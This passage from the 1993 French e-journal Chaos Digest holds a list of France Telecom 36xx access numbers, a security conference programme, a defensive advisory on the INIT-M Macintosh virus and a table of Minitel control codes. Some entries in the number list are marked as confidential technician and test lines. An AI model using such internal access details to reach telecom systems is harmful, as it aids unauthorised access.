3602        Transpac access (2,400 & 4,800 baud/s)
3603        Transpac X.32
3605mcdu    "Numero Vert" by Minitel (it's like the 800 phone
            numbers but for X.25 computer access). FREE.
36062424    Asynchrounous computer access (300-2,400 baud/s)
360736du    Reference PAVI (for X.25 services test procedures)
36086464    Synchronous Transpac access 64 kbit/s
3609mcdu    Computer access for Alphapage (the French pager)
            message delivery. {mcdu=} 0909 for a 80-characters
            alpha-numeric message
3610        Automatic French access for calls using a "Carte
            Pastel" (the equivalent of an MCI or AT&T phone
            card, but with three options: (1) restricted access
            for children able to phone only to 10 predefined
            phone numbers; (2) national, and (3) international)
3612        Minicom, the France Telecom videotex mail system
            directly linked with your phone number
3613        Videotex access Teletel 1
            TTY access (no-business services)
3614        Videotex access Teletel 2
3615        Videotex access Teletel 3
3616        Videotex access, business services
3617        Videotex access, business services (high price)
3618        Minitel-to-Minitel communications (for blind peoples
            for example)
3619        International Minitel services (phone directories, e.g.)
3621        ASCII standard access
3622        Teletel access for Germany, Belgium Italy, Luxembourg
            and in a short time, all European countries
3623        Minitel--High Speed Access (2,400 baud/s and more)
3624mcdu    Business X.25 access
3625mcdu    Business X.25 access
3626mcdu    Business X.25 access
3627mcdu    Business X.25 access
3628mcdu    Business X.25 access
3629mcdu    Business X.25 access
3637        TV special abbreviated national phone number, like for
            "Telethon 1993" action
3638mcdu    ISDN France-Luxembourg
3642        Technician Position--FRANCE TELECOM (confidential)
36431111    International Phone Book
3644        DERAL (phone qualities parameters tests)--FRANCE
            TELECOM (confidential)
3646        Configuration tests--FRANCE TELECOM (confidential)
3650        Direct voice phone operator for "Carte Pastel"
3653        Systeme Teletext-Telex
3655        Phoned telegrams
3656        Telegrams posted by Minitel
3658        France Telecom' customers local reclamation service
3659mcdu    Local night phone information service
36606060    15-digit message for Alphapage
36616136    Operator's pager messages delivery service
3663mcdu    Numero Azur (another type of tarification for extra
            phone number: FRF 0.73 pro call without any restriction
            regarding the call duration)
3664mcdu    Audiotel, paided phone service
3665mcdu    Audiotel, paided phone service: 5 UT (FRF 3.65 pro call)
3666mcdu    Audiotel, paided phone service: MEDIA
3667mcdu    Audiotel, paided phone service
3668mcdu    Audiotel, paided phone service
3670mcdu    Audiotel, paided phone service
3672        MemoPhone: public answering system (maximum 5 messages
            of 30 secondes): FRF 1.46
3673mcdu    MemoPhone between all French departements: {mcdu=} {mcmc=}
            with {mc=} the departement postal code. For example, for
            Paris, {mc=} 75.
3689mcdu    Conference by phone (max. 25 persons)
3699        Voice clock


                   _____Jean-Bernard Condat_____
 [Editor of _Chaos Digest_, the first computer security e-journal]
             CCCF, B.P. 8005, 69351 Lyon Cedex 08, France
              Phone: +33 1 47874083; Fax: +33 1 47877070
          InterNet: jbcondat@attmail.com  or  cccf@altern.com

------------------------------

Date: Thu, 22 Apr 93 18:02:45 -0500
From: celma_s@epita.fr (Samuel Celma )
Subject: File 2--_Securite Informatique '93_ (annonce)


                      5e manifestation annuelle
                      Securite Informatique '93

            23-24 Septembre 1993, Maison de la Chimie, PARIS
        (Maison de la Chimie, 28 rue Saint-Dominique, 75007 Paris
                    tel.: 47051073; fax: 45559862)

               21-22 Juin 1993, Hotel Beau Rivage, GENEVE
        (Hotel Beau Rivage, 13 quai du Mont-Blanc, CH-1201 Geneve
               tel +41 22 731 02 21, fax: +41 22 738 98 47)


21 Bonnes Raisons de Participer a cette Manifestation

1. Determinez les directions dans lesquelles les structures europeennes vont
   s'engager en matiere de securite informatique;

2. Apprenez a mettre en place et a gerer le suivi de votre politique de
   securite;

3. Mesurez les couts et reussissez la negociation du budget securite avec
   votre Direction Generale;

4. Faites le point sur les resultats de l'utilisation de la loi en matiere
   de fraude informatique et anticipez les changements au niveau des
   institutions europeennes;

5. Prenez conscience du suivi de l'enquete sur le terrain et des relations
   indispensables entre le manager et les forces de l'ordre;

6. Evaluez le role de l'assurance et sa place dans une politique de securite;

7. Prenez part a une demonstration d'interactivite virale afin de mieux
   comprendre les facons de gerer l'apres sinistre;

8. Determinez les moyens a mettre en oeuvre pour assurer a la fois Qualite
   et securute;

9. Maitrisez les elements d'une mission securite des Echanges de Donnees
   Informatisees;

10. Devenez l'expert securite de l'environnement UNIX de votre entreprise;

11. Maitrisez la gestion au quotidien d'une securite qui est primordiale a
   la bonne sante de votre entreprise;

12. Tirez profit des etudes de cxas afin de baser vos futurs developpements
   sur les conseils avertis d'utilisateurs;

13. Adaptez la securite informatique a votre societe, quelle que soit sa
   taille, en profitant d'exploses concrets, destines aux entreprises de
   dimensoin moyenne;

14. Ayez une longueur d'avance sur la concurrence en appliquant les principes
   et les methodes de securisation de vos Systemes d'Information;

15. Developpez une strategie securite afin de parer a l'eventualite d'une
   sous-traitance temporaire ou definitive de vos moyens informatiques;

16. Optimisez votre participation en choisissant a l'avance vos ateliers;

17. Beneficiez des syntheses d'atelier afin de maitriser l'aspect global de
   la securite informatique;

18. Venez rencontrer vos homologues et debattre avec eux des metiers de la
   securite informatique;

19. Beneficiez du dialogue offert par la table ronde pour reflechir en
   interne, sur la formation des professionels de la securite des Systemes
   d'Infomation;

20. Rencontrez les experts en securite informatique venus de Belgique, de
   France et de Suisse pour prendre part a cet evenement annuel;

21. faites le bilan de vos competences pour palier les besoins de
   securisation.


PREMIERE JOURNEE

 8.30  Accueil des participants

 9.00  Allocution d'ouverture du President
       PARIS: Jean-Philippe JOUAS, Dir Surete & Protection, BULL
       GENEVE: Jean-Luc CHAPPUIS, Pres. CLUSIS

 9.15  Le Panorama de la Securite Informatique
       - Quelles sont les normes europeennes qui vont changer le panorama
         de la securite informatique?
       - Quels sont les enjeux du programme Infosec?
       Gerard BOUGET, Vice-Pres. FIASI

 9.45  La methodologie d'un audit de securite du systeme d'information
       - Approche et demarche de l'audit, de la methodologie a la pratique
       - Presentation des resultats et bilans
       Guy TOLLET, Internal Audit Manager, AG 1824

10.30  Pause cafe

10.45  Mise en oeuvre et evolution du schema directeur
       - La mise en oeuvre, la gestion et son suivi
       - Que faire pour que le schema directeur reflete la strategie de
         l'entreprise?
       - Comment apporter les modifications necessaires afin de suivre
         l'evolution?
       Guy POINAS, Responsable Qualite-Securite, FRAMATOME

11.30  Comment maintenir operationnels les moyens de sauvegarde et de secours
       - La disponibilite des donnes et des moyens
       - Actualisation des differents plans
       - Quels sont les controles, audit et tests a realiser?
       Alain REFFRAY, Pres. du Directoire, EXPLOITIQUE

12.15  Les couts de la securte: comment justifier un budger securite
       informatique en periode de crise economique?
       - Comptabilite analytique des couts: comment mesurer la rentabilite
         de l'investissement securite?
       - Comment chiffrer les besoins en securite informatique?
       - La negociation avec la DG: quels sont les arguments a developper?
       - Peut-on vendre le projet securite?
       Luc GOLVERS, Pres. du CLUSIB

13.00  Dejeuner

14.45  Evolution des besoins en matiere de fraude informatique
       - Etudes et resultats de l'utilisation de la loi de 1988
       - Etat de la legislation dans les pays de la CEE
       - Etat des projets au niveau des institutions europeennes
       Jacques GODFRAIN, Depute de l'Aveyron, ASSEMBLEE NATIONALE

15.30  ATELIER LEGISLATION
       Aspects Juridiques: Moyens de Prevention et sanctions
       - Mesures de prevention pour assurer la securite du systeme
         d'information
       - Quels sont les recours et sanctions?
       Alain BENSOUSSAN, Avocat, Cabinet Alain BENSOUSSAN

       ATELIER ASSURANCE
       Risk Management: Le financement de l'apres sinistre
       - Les limites du transfert a l'assurance: garanties et capacites
         financieres actuellement disponibles
       - Les conditions d'une assurance adequate et fiable: comment etendre
         le champ de l'assurable et eviter surprimes et sous-assurances
       Yves MAQUET, Risk Manager Consultant, SUGMA RISK
       & Gilbert FLEPP, Resp. Souscription Risques et Techn., CIGNA FRANCE

       ATELIER REPRESSION
       La demarche d'une enquete sur la fraude informatique
       - L'ampleur du phenomene criminalite reelle, apparente et legale
       - Les differents services repressifs: problematique et illustration
         de l'enquete de Police
       - Perspectives d'evolution de la deliquance informatique
       PARIS: Christian MIRABEL, Chef Sect. Informatique, Brigade Financiere
              Direction de la Police Judiciaire
       GENEVE: Daniel CHEVALLEY, Brig. Fin., Police de Surete Vaudoise

16.15  Pause cafe

16.45  Synthese des Ateliers

17.15  Les virus informatiques: les enjeux de la securite post-contamination
       - Comment aborder la demarche post-contamination
       - La distinction entre detection/diagnostic et elimination/reparation
       - Caracteristiques et risques de l'interactivite virale
       Jean-Claude HOFF, Vice-Pres. Club Sec. Informatique Region Picardie

18.15  Allocution de cloture du President

18.30  Fin de la premiere journee


SECONDE JOURNEE

 8.30  Accueil des participants

 9.00  Allocution du President
       PARIS: Luc GOLVERS, President du CLUSIB
       GENEVE: Gerard BOUGET, FIASI

 9.15  ATELIER SECURITE & EDI
       Les enjeux specifiques a la securite des echanges de donnees
       - Doit-on controler et auditer les systemes EDI?
       Christophe CUSSAC, Expert Comptable, GUERARD VIALA

       Les moyens de securite et de controle propres aux EDI
       - Les possibilites de controle a l'interieur des messages et de l'EDI
       - Utilisation des messages EDI specifiques pour assurer la securite
       Juerg BRUN, Expert Comptable diplome, ATAG ERNST & YOUNG

       ATELIER SECURITE D'UN PARC MICRO
       Mesures de precaution et de recherche d'outils
       - Le role du centre d'expertise de lutte anti-virus
       - Presentation de differents moyens de sensibilisation
       - Explication des differents outils
       Pierre LESCOP, Resp. Div. Micro-Informatique et Anti-Virus, Serv.de
       Recherche Tech., LA POSTE

       Systemes de gestion et d'administration de la securite des reseaux
       locaux
       - Presentation des besoins pour la securite d'un Lan
       - Mise en place d'un concept de securite
       Christian SCHERRER, Dir., CW CONCEPTWARE

       ATELIER SECURITE SOUS ENVIRONNEMENT UNIX
       - Historique et principes: Unix est-il un OS passoire?
       - Les failles les plus frequentes en environnement UNIX
       - Les solutions additionnelles de niveau C2 et apercu d'un solution B1
       - Les solutions a moyen terme pour une informatique distribuee
       Loup GRONIER, Resp. Formation, CF6 AGENCE SECURITE

10.45  Pause cafe

11.15  Synthese des Ateliers

11.45  Etude de Cas
       Qualite d'acces logique dans le cadre d'un reseau heterogene a la RATP
       Christian PETITPAS, Resp. Securite des Syst. d'Inf., RATP

12.30  Dejeuner

14.15  ATELIER ENTREPRISES DE DIMENSION MOYENNE
       De la therapie appliquee a un jeune etablissement financier en vue de
       son immunisation contre les risques
       - L'approche du generaliste
         * L'examen clinique face a l'environnement "hostile"
         * Les forces vitales a preserver
         * Le traitement applique
       - Les examens de controle du specialiste
       - Le bilan de sante actuel
       Bernard MALAN, Resp. Gestion Res. Techn., FIMAGEST

       Comment aborder la demarche de choix d'un solution de backup
       PARIS: Alan SILLITOE, Resp. Informatique, CHRISTIAN BERNARD DIFFUSION
       GENEVE: Pierre DELETRAZ, Dir., COMPUTER SECURITY SITE S.A.

       ATELIER INDUSTRIE
       Les enjeux de la securite des systemes d'information dans un
       environnement de production
       - Introduction aux objectifs d'une entreprise industrielle
       - La vulnerabilite des systemes d'information dans ce cadre
       - Realisation, choix et perspectives
       Jean-Louis SZUBA, Agent Cental de Sec. Inf., AEROSPACIALE

       La Securite informatique dans un centre de recherche (Etude de Cas)
       - La securite informatique et la protection du patrimoine
       - Les moyens a la disposition des chercheurs
       - Organisation de la securite; les procedures et les outils
       Michel COMBE: Resp. Mission Sec., EDF-DIR ETUDES & RECHERCHES

       ATELIER BANQUES
       Le perimetre "Securite": Pourquoi un tableau de bord securite?
       - Les connections (VTAM)
       - Le logiciel de securite du systeme d'exploitation (RACF)
       - Le referentiel de la securite applicative
       PARIS: Bertrand de la RENAUDIE, Resp. Sec., BANQUE INDOSUEZ
       GENEVE: Jacques BOURACHOT, Resp. Inf., BANQUE INDOSUEZ

       Etudes de cas
       PARIS: La demarche securite au CTR Nord-Est
              - Etude securite et mesures prises
              - L'acquis des experiences
              Roger KNOCHEL, Resp. Securite, CTR NORD-EST, CAISSE D'EPARGNE
       GENEVE: Organisation et gestion de la securite informatique dans un
              contexte de facilities management
              - Le FM et ses prestations dans un milieu bancaire
              - Presentation d'un contexte operationnel
              - Politique de securite: regles et responsabilites
              - Les domaines de securite et leurs interactions
              - Les impacts du FM sur la gestion et l'admin. de la securite
              Raymond ROCHAT, Resp. Securite Inf., BANQUE CANTONALE VAUDOISE

15.45  Pause cafe

16.15  Qualite et securite, partenaires incontournables
       - De quelle maniere peut-on conciler Qualite et Securite?
       Gerard BOUGET, FIASI

17.00  Table ronde
       Les metiers de la securite des systemes d'information
       - Comment la structure peut-elle influencer la fonction?
       - Jusqu'ou vont les responsabilites du Dir. des Syst. d'Inf. (DSI)
         dans sa mission securite informatique
       - Remise en cause de la fonction Dir. Sec. des Syst. d'Inf. (DSSI):
         comment assurer une parfaite securite lorsqu'on assure plusieurs
         missions DSI?
       - Comment assurer la formation des professsionnels de la securite?
       Animateur Paris: Luc Golvers. Avec: Rene KRAFT, CENCEP; Bernard
         MALAN, FIMAGEST; Eddie SOULIER, CIGREF, & Jean VERGNOUX, RENAULT.
       Animateur Geneve: Jean-Luc CHAPPUIS, CLUSIS. Avec: Bernard MALAN,
         FIMAGEST; Jean MENTHONNEX, EPI INGENIEURS-CONSEILS S.A.; Raymond
         ROCHAT, BANQU CANTONALE VAUDOISE.

18.30  Allocution de cloture du President

18.45  Fin de manifestation


|     Inscrivez vous et envoyez le reglement avant le 23 Avril 1993 et      |
|l'Institute for International Research vous offrira gracieusement l'ouvrage|
|                                                                           |
|"Les virus, methodes et techniques de securite" de  Jean-Claude HOFF (1992)|

------------------------------

Date: Thu, 22 Apr 93 18:02:45 -0500
From: spaf@cs.purdue.edu
Subject: File 3--Nouveau virus Mac: INIT-M


                New Macintosh Virus Discovered (INIT-M)
                             22 Apr 1993


Virus: INIT-M
Damage: Alters applications and other files; may severely damage
        file system on infected Macs.  See text below.
Spread: possibly limited, but has potential to spread quickly
Systems affected: All Apple Macintosh computers, under only System 7


The INIT-M virus was recently discovered at Dartmouth College, in a
file downloaded off the net.  This is a DIFFERENT virus than the
INIT-17 virus announced April 12.  It is a malicious virus that may
cause severe damage.

INIT-M rapidly spreads to applications, system extensions, documents
and preference files under System 7; it does not spread or activate on
System 6 systems.  The virus spreads as the application files are run,
and is likely to spread extensively on an infected machine.  The
infection is accomplished by altering existing program code. Besides
this incidental damage (that may, because of bugs in the virus code,
cause more severe damage), the virus also does extensive damage to
systems running on any Friday the 13th -- *not* just booted on that
day.  Files and folders will be renamed to random strings, creation
and modification dates will be changed, and file creator and type
information will be scrambled.  In some very rare circumstances, a
file or files may be deleted.  This behavior is similar to the
previously announced (March 1992) INIT-1984 virus.  Recovery from this
damage will be very difficult or impossible.

Note that the next three Friday the 13ths are in August 1993, May 1994,
and January 1995.

The virus, when present on an infected system, may interfere with the
proper display of some application window operations.  It will also
create a file named "FSV Prefs" in the Preferences folder.

Recent versions of Gatekeeper and SAM Intercept (in advanced and
custom mode) are effective against this virus.  Either program should
generate an alert if the virus is present and attempts to spread to
other files.


The authors of all other major Macintosh anti-virus tools are planning
updates to their tools to locate and/or eliminate this virus. Some of
these are listed below. We recommend that you obtain and run a CURRENT
version of AT LEAST ONE of these programs.


Some specific information on updated Mac anti-virus products follows:

    Tool: Central Point Anti-Virus
    Status: Commercial software
    Revision to be released: 2.01e
    Where to find: Compuserve, America Online, sumex-aim.stanford.edu,
                   Central Point BBS, (503) 690-6650
    When available: immediately
    Comments: The MacSig file will be dated 4/22/93


    Tool: Disinfectant
    Status: Free software (courtesy of Northwestern University and
            John Norstad)
    Revision to be released: 3.2
    When available: immediately
    Where to find: usual archive sites and bulletin boards --
                   ftp.acns.nwu.edu, sumex-aim.stanford.edu,
                   rascal.ics.utexas.edu, AppleLink, America Online,
                   CompuServe, Genie, Calvacom, MacNet, Delphi,
                   comp.binaries.mac


    Tool: Gatekeeper
    Status: Free software (courtesy of Chris Johnson)
    Revision to be released: No new revision needed; 1.2.7 works
    When available: immediately
    Where to find: usual archive sites and bulletin boards --
                   microlib.cc.utexas.edu, sumex-aim.stanford.edu,
                   rascal.ics.utexas.edu, comp.binaries.mac


    Tool: Rival
    Status: Commercial software
    Revision to be released: INIT-M Vaccine
    When available: Immediately.
    Where to find it: AppleLink, America Online, Internet, Compuserve.


    Tool: SAM (Virus Clinic and Intercept)
    Status: Commercial software
    Revision to be released: 3.5.6
    When available: immediately
    Where to find: CompuServe, America Online, Applelink, Symantec's
                   Customer Service @ 800-441-7234
    Comments: Updates to various versions of SAM to detect and remove
          INIT-M are available from the above sources.


    Tool: Virex
    Status: Commercial software
    Revision to be released: 3.93
    Where to find: Datawatch Corporation, (919) 490-1277
    When available: Detection Strings will be available 4/27 on AOL
        and on the "DataGate" BBS @ (919) 419-1602. Updated version
        with detection, repair and prevention capabilities will be
        available next week.
    Comments: Virex 3.93 will detect the virus in any file, and
    repair any file that has not been permanently damaged.  All Virex
    subscribers will automatically be sent an update on diskette.  All
    other registered users will receive a notice by mail.


    Tool: VirusDetective
    Status: Shareware
    Revision to be released: 5.0.9
    When available: immediately
    Where to find: various Mac archives
    Comments: VirusDetective is shareware.  Search strings for the new
           virus will be sent only to registered users.


If you discover what you believe to be a virus on your Macintosh
system, please report it to the vendor/author of your anti-virus
software package for analysis.  Such reports make early, informed
warnings like this one possible for the rest of the Mac community.  If
you are otherwise unsure of who to contact, you may send e-mail to
spaf@cs.purdue.edu as an initial point of contact.

Also, be aware that writing and releasing computer viruses is more
than a rude and damaging act of vandalism -- it is also a violation of
many state and Federal laws in the US, and illegal in several other
countries.  If you have information concerning the author of this or
any other computer virus, please contact any of the anti-virus
providers listed above.  Several Mac virus authors have been
apprehended thanks to the efforts of the Mac user community, and some
have received criminal convictions for their actions.  This is yet one
more way to help protect your computers.

------------------------------

End of Chaos Digest #1.21
************************************

Chaos Digest                Lundi 3 Mai 1993         Volume 1 : Numero 22
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.22 (3 Mai 1993)
File 1--Repertoire des codes de programmation du Minitel
File 2--Virus et Protection #1 (tribune libre)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon, 26 Apr 93 00:03:56 +0200
From: mendoza@cygnux.fr.mugnet.org (Samuel Mendoza )
Siubject: File 1--Repertoire des codes de programmation du Minitel
Repost from: fr.comp.divers


              REPERTOIRE DES CODES DE PROGRAMATION DU MINITEL

Ces sequences ESCAPE sont decodees par le MINITEL soit en provenance
de la ligne telephonique soit en provenance du module prise peri-
informatique (fiche DIN).

CODES D'ATTRIBUTS:

Caractere noir             | 1B 40             | 27 64             | ESC @
Caractere rouge            | 1B 41             | 27 65             | ESC A
Caractere vert             | 1B 42             | 27 66             | ESC B
Caractere jaune            | 1B 43             | 27 67             | ESC C
Caractere bleu             | 1B 44             | 27 68             | ESC D
Caractere magenta          | 1B 45             | 27 69             | ESC E
Caractere cyan             | 1B 46             | 27 70             | ECC F
Caractere blanc            | 1B 47             | 27 71             | ESC G

Fond noir                  | 1B 50             | 27 80             | ESC P
Fond rouge                 | 1B 51             | 27 81             | ESC Q
Fond vert                  | 1B 52             | 27 82             | ESC R
Fond jaune                 | 1B 53             | 27 83             | ESC S
Fond bleu                  | 1B 54             | 27 84             | ESC T
Fond magenta               | 1B 55             | 27 85             | ESC U
Fond cyan                  | 1B 56             | 27 86             | ESC V
Fond blanc                 | 1B 57             | 27 87             | ESC W

Clignotement               | 1B 48             | 27 72             | ESC H
Fixe                       | 1B 49             | 27 73             | ESC I

Debut incrustation         | 1B 4B             | 27 75             | ESC K
Fin incrustation           | 1B 4A             | 27 74             | ESC J

Taille normale             | 1B 4C             | 27 76             | ESC L
Double hauteur             | 1B 4D             | 27 77             | ESC M
Double largeur             | 1B 4E             | 27 78             | ESC N
Double taille              | 1B 4F             | 27 79             | ESC O

Debut masque ligne         | 1B 58             | 27 88             | ESC X
Fin masque ligne           | 1B 5F             | 27 95             | ESC _

Debut soulignement         | 1B 5A             | 27 90             | ESC Z
Fin soulignement           | 1B 59             | 27 89             | ESC Y

Video inverse              | 1B 5D             | 27 93             | ESC e
Video normale              | 1B 5C             | 27 92             | ESC c
Transparence               | 1B 5E             | 27 94             | ESC i

Sonnerie                   | 7                 | 7                 | iG

Curseur gauche             | 8                 | 8                 | iH
Curseur droite             | 9                 | 9                 | iA
Curseur bas                | A                 | 10                | iJ
Curseur haut               | B                 | 11                | i

Effacement ecran           | C                 | 12                | iL

Retour chariot             | D                 | 13                | iM

Mode semi-graphique        | E                 | 14                | iN
Mode texte                 | F                 | 15                | iO

Curseur visible            | 11                | 17                | iQ
Curseur invisible          | 14                | 20                | iT
Repetition x caracteres    | 12 x+40           | 18 x+64           | iR x+64
Commandes et fonctions     | 13                | 19                | iS (SEP)

Accents                    | 19                | 25                | iY
Livre                      | 19 23             | 25 35             | iY #
Paragraphe                 | 19 27             | 25 39             | iY '
Fleche gauche              | 19 2C             | 25 44             | iY ,
Fleche haute               | 19 2D             | 25 45             | iY -
Fleche droite              | 19 2E             | 25 46             | iY .
Fleche basse               | 19 2F             | 25 47             | iY /
Rond                       | 19 30             | 25 48             | iY 0
Plus/moins                 | 19 31             | 25 49             | iY 1
Quart                      | 19 3C             | 25 60             | iY <
Demi                       | 19 3D             | 25 61             | iY =
Trois quart                | 19 3E             | 25 62             | iY >
Accent grave               | 19 41             | 25 65             | iY A
Accent aigu                | 19 42             | 25 66             | iY B
Accent circonflexe         | 19 43             | 25 67             | iY C
Trema                      | 19 48             | 25 72             | iY H
OE majuscule               | 19 6A             | 25 106            | iY j
OE minuscule               | 19 7A             | 25 122            | iY z
Beta                       | 19 7B             | 25 123            | iY e
Curseur ligne 1 colonne 1  | 1E                | 30                | i.
Positionnement curseur
en ligne y et colonne x    | 1F y+40 x+40      | 31 y+64 x+64      | i? y+64
x+64

LES FONCTIONS SEP

Envoi                      | 13 41             | 19 65             | iS A
Retour                     | 13 42             | 19 66             | iS B
Repetition                 | 13 43             | 19 67             | iS C
Guide                      | 13 44             | 19 68             | iS D
Annulation                 | 13 45             | 19 69             | iS E
Sommaire                   | 13 46             | 19 70             | iS F
Correction                 | 13 47             | 19 71             | iS G
Suite                      | 13 48             | 19 72             | iS H
Connexion/Fin              | 13 49             | 19 73             | iS I

Lancement PCE              | 13 4A             | 19 74             | iS J
Fin PCE                    | 13 4B             | 19 75             | iS K

Retournement               | 13 4C             | 19 76             | iS L
Retournement inverse       | 13 4D             | 19 77             | iS M

Changement vitesse modem
  - a la connexion         | 13 50             | 19 80             | iS P
  - en cours de connexion  | 13 51             | 19 81             | iS Q

Acquittements
-Module telephonique       | 13 52             | 19 82             | iS R
-Connexion ou deconnexion
 Modem                     | 13 53             | 19 83             | iS S
-Peripheriques             | 13 54             | 19 84             | iS T
-Modules logiciels         | 13 55             | 19 85             | iS U
-Changement mode           | 13 56             | 19 86             | iS V
-Transparence              | 13 57             | 19 87             | iS W
-Debut ou fin retournement | 13 58             | 19 88             | iC X
-Debut ou fin copie ecran  | 13 5C             | 19 92             | iS c
-Passage Teletel a Telein-
 formatique                | 13 5E             | 19 94             | iS i
-Passage Videotext a Mixte | 13 70             | 19 112            | iS p
-Passage Mixte a Videotext | 13 71             | 19 113            | iS q

PROTOCOLE

Masquage ecran             | 1B 23 20 58       | 27 35 32 88       | ESC #
                                                                     SP X
Demasquage ecran           | 1B 23 20 5F       | 27 35 32 95       | ESC #
                                                                     SP _
Mode transparent ecran     | 1B 25             | 27 37             | ESC %
Fin mode precedent         | 1B 2F 3F          | 27 47 63          | ESC / ?
Demande position du curseur| 1B 61             | 27 97             | ESC a
Commande d'un peripherique | 1B o1 o2          | 27 o1 o2          | ESC o1
                                                                     o2
PRO1                       | 1B 39             | 27 57             | ESC 9
PRO2                       | 1B 3A             | 27 58             | ESC :
PRO3                       | 1B 3B             | 27 59             | ESC ;

Les commandes suivantes font appel a PRO1:

Bis **                     | 50                | 80                | P
Decrochage **              | 53                | 83                | S
Commutation donnees
phonie **                  | 54                | 84                | T
Racrochage **              | 57                | 87                | W
Coupure calibree **        | 58                | 88                | X
Remise a zero **           | 59                | 89                | Y
Demande de statut telepho-
nique **                   | 5A                | 90                | Z
Deconnexion                | 67                | 10|               | g
Connexion                  | 68                | 104               | h
Retournement modem         | 6C                | 108               | l
Retournememt inverse       | 6D                | 109               | m
Acquittement retournement  | 6E                | 110               | n
Mode maitre (retournement) | 6F                | 111               | o
Demande status terminal    | 70                | 112               | p
Demande status fonctionne-
ment                       | 72                | 114               | r
Demande status vitesse     | 74                | 116               | t
Demande status protocole   | 76                | 118               | v

Telechargemenp RAM1        | 78                | 120               | x
Telechargement RAM2        | 79                | 121               | y
Identification RAM1        | 7A                | 122               | z
Identification terminal    | 7B                | 123               | e
Reset videotexte           | 7F                | 127               | DEL

Les commandes suivantes font appel a PRO2:

(R = Code recepteur, E = Code Emetteur, Cf = Code de fonctionnement)

Passage mode teleinformati-
que                        | 31 7D             | 49 125            | 1 e
Passage videotexte a mixte | 32 7D             | 50 125            | 2 e
Passage mixte a videotexte | 32 7E             | 50 126            | 2 u
Commutation donnees
phonie **                  | 55 4E             | 85 78             | U N

Reponse au statut telepho-
nique **                   | 5B octet          | 91 octet          | a octet
Demande status module      | 62 R ou E         | 98 R ou E         | b R (E)
Non diffusion acquattements
protocoles                 | 64 R ou E         | 100 R ou E        | d R (E)
Diffusion acquittements
protocoles                 | 65 R ou E         | 101 R ou E        | e R (E)
Transparence n octets      | 66 n              | 102 n             | f n
Lancement fonctionnement   | 69 Cf             | 105 Cf            | i Cf
Arret fonctionnement       | 6A Cf             | 106 Cf            | j Cf
Affectation vitesse        | 6B octet          | 107 octet         | k octet
Mode ESClave               | 6F 31             | 111 49            | o 1
Reponse status terminal    | 71 octet          | 113 octet         | q octet
Demande status clavier     | 72 59             | 114 89            | r Y
Reponse status fonctionne-
ment                       | 73 octet          | 115 octet         | s octet
Reponse status vitesse     | 75 octet          | 117 octet         | u octet
Reponse status protocole   | 77 octet          | 119 octet         | w octet
Copie ecran sur imprimante
-en jeu francais           | 7C 6A             | 124 106           | 3 j
-en jeu americaan          | 7C 6B             | 124 107           | 3 k

Les commandes suivantes font appel a PRO

(R = Code recepteur, E = Code Emetteur, Mf = Mode de fonctionnement )

Composition a partir de
l'ecran **                 | 52 33 58 33 59    | 82 51 88 51 89    | R 3X
Arret aiguillage           | 60 R E            | 96 R E            | d R E
Lancement aiguillage       | 61 R E            | 97 R E            | a R E
Reponse status module      | 63 R (ou E) octet | 99 R (ou E) octet | c R (E)
Programmation du clavier   | 69 59 Mf          | 105 89 Mf         | i Y Mf
Deprogrammation du clavier | 6A 59 Mf          | 106 89 Mf         | j Y Mf
Reponse status clavier     | 73 59 octet       | 115 89 octet      | s Y octet

* Status terminal (signification de l'octet renvoye)

Bit 0: etat du terminal a la connexion. Si ce bit est a 1, il est oppose.
Bit 1: vitesse modem. Si ce bit est a 1, on recoit en 1200 bauds.
Bit 2: module telephonique.
Bit 3: detection de la porteuse. Si ce bit est a 1, le terminal est
       connecte.
Bit 4: etat du fil PT sur la prise. Si ce bit est a 1, le reseau Minitel est
       actif.
Bit 5: module logiciel.
Bit 6: NC
Bit 7: bit de parite.

* Status vitesse (signification de l'octet renvoye ou emis)

Bits 0,1,2: reception.
Bits 3,4,5: emission.
Bit 6     : NC
Bit 7     : bit de parite.

Pour les bits de receptions ou d'emissions:
000 = NC
001 = 75 bauds
010 = 300 bauds
011 = NC
100 = 1200 bauds
101 = NC
110 = 4800 bauds
111 = NC (9600 sur M2 ?)

* Status fonctionnement (signification de l'octet renvoye)

Bit 0: format d'ecran. Si ce bit est a 1, le Minitel est en 80 colonnes.
Bit 1: Mode rouleau. Si ce bit est a 1, le mode rouleau est actif.
Bit 2: mode PCE (Procedure de Correction d'Erreurs). Si ce bit est a 1,
       le mode PCE est actif.
Bit 3: Mode min/MAJ. Si ce bit est a 1, le terminal est en minuscules.
Bit 4: loupe haute.
Bit 5: loupe basse.
Bit 6: NC
Bit 7: bit de parite.

* Status clavier (signification de l'octet renvoye)

Bit 0: clavier etendu. Si ce bit est a 1, le clavier est etendu.
Bit 1: clavier normal.
Bit 2: NC
Bit 3: NC
Bit 4: NC
Bit 5: NC
Bit 6: NC
Bit 7: bit de parite.

